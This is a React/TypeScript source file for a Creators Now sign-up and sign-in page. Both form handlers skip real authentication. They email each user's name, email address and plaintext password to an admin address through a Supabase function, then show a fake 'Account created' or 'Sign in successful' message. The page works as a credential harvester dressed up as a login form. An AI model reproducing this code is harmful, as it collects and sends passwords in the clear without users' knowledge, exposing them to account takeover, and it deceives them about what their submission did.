
import React, { useState } from 'react';
import { supabase } from '@/integrations/supabase/client';
import AuthHeader from '@/components/auth/AuthHeader';
import UserTypeSelector from '@/components/auth/UserTypeSelector';
import AuthForm from '@/components/auth/AuthForm';

const Auth = () => {
  const [userType, setUserType] = useState<'storyteller' | 'creator'>('storyteller');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [successMessage, setSuccessMessage] = useState<string | null>(null);

  // Send admin notification when forms are submitted
  const sendAdminNotification = async (formData: {
    name: string;
    email: string;
    password?: string;
    userType: string;
    actionType: 'signup' | 'signin';
  }) => {
    try {
      const demoCode = sessionStorage.getItem('demoCode') || 'unknown';
      
      await supabase.functions.invoke('send-email', {
        body: {
          email_type: 'admin_notification',
          admin_email: 'info@creators.now',
          form_data: {
            ...formData,
            demo_code_used: demoCode,
            timestamp: new Date().toISOString()
          }
        }
      });
    } catch (error) {
      console.error('Failed to send admin notification:', error);
    }
  };

  const handleSignUp = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setIsLoading(true);
    setError(null);
    setSuccessMessage(null);

    const formData = new FormData(e.currentTarget);
    const name = formData.get('name') as string;
    const email = formData.get('email') as string;
    const password = formData.get('password') as string;

    // Send admin notification
    await sendAdminNotification({
      name,
      email,
      password,
      userType,
      actionType: 'signup'
    });

    // Show success message (no real account creation)
    setSuccessMessage('Account created successfully! Welcome to Creators Now.');
    setIsLoading(false);
  };

  const handleSignIn = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setIsLoading(true);
    setError(null);
    setSuccessMessage(null);

    const formData = new FormData(e.currentTarget);
    const email = formData.get('email') as string;
    const password = formData.get('password') as string;

    // Send admin notification
    await sendAdminNotification({
      name: email.split('@')[0], // Use email prefix as name for signin
      email,
      password,
      userType,
      actionType: 'signin'
    });

    // Show success message (no real authentication)
    setSuccessMessage('Sign in successful! Welcome back to Creators Now.');
    setIsLoading(false);
  };

  return (
    <div className="min-h-screen bg-black">
      <AuthHeader />

      <div className="flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
        <div className="max-w-md w-full space-y-8">
          <UserTypeSelector 
            userType={userType} 
            onUserTypeChange={setUserType} 
          />

          <AuthForm
            userType={userType}
            isLoading={isLoading}
            error={error}
            successMessage={successMessage}
            onSignUp={handleSignUp}
            onSignIn={handleSignIn}
          />
        </div>
      </div>
    </div>
  );
};

export default Auth;
